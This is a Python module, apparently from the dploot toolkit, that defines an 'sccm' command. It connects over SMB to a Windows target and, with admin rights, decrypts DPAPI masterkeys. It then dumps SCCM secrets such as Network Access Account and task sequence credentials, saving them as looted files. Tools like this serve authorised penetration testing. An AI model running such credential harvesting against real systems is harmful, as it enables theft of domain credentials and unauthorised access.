import argparse
import logging
import sys
from typing import Callable, Tuple

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.sccm import SCCMTriage

NAME = "sccm"


class SCCMAction:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self._users = None
        self.outputdir = None
        self.masterkeys = None

        self.outputdir = handle_outputdir_option(directory=self.options.export_dir)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info(
            "Connected to {} as {}\\{} {}\n".format(
                self.target.address,
                self.target.domain,
                self.target.username,
                ("(admin)" if self.is_admin else ""),
            )
        )
        if self.is_admin:
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def secret_callback(secret):
                if self.options.quiet:
                    secret.dump_quiet()
                else:
                    secret.dump()

            triage = SCCMTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_secret_callback=secret_callback,
            )
            logging.info("Triage SCCM Secrets\n")
            triage.triage_sccm(use_wmi=self.options.wmi)
            dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin


def entry(options: argparse.Namespace) -> None:
    a = SCCMAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME,
        help="Dump SCCM secrets (NAA, Collection variables, tasks sequences credentials)  from local or remote target",
    )

    group = subparser.add_argument_group("sccm options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    group.add_argument(
        "-wmi",
        action="store_true",
        help=("Dump SCCM secrets from WMI requests results"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
